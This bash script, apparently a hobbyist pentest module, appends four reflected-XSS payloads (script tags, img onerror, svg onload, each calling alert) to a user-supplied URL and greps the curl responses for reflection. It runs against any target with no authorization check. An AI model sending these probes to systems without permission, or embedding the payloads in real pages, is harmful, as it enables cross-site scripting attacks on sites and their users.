#!/bin/bash

# XSS Payload Tester – MCW Phantom Sentinel Module
# Author: Hacker Asad

echo "[+] XSS Payload Tester Module Activated"
read -p "Enter target URL with parameter (e.g. https://example.com/index.php?q=): " target

# Define basic payloads
payloads=(
  "<script>alert('MCW')</script>"
  "\"><script>alert('MCW')</script>"
  "'><img src=x onerror=alert('MCW')>"
  "<svg/onload=alert('MCW')>"
)

echo "[+] Testing XSS payloads on: $target"
for payload in "${payloads[@]}"; do
  url="${target}${payload}"
  echo -e "\n[•] Testing: $url"
  curl -s -L "$url" | grep -q "$payload"

  if [[ $? -eq 0 ]]; then
    echo -e "[✔] ${payload} might be reflected!"
  else
    echo -e "[✘] ${payload} not found in response."
  fi
done

echo -e "\n[+] XSS Test Completed."
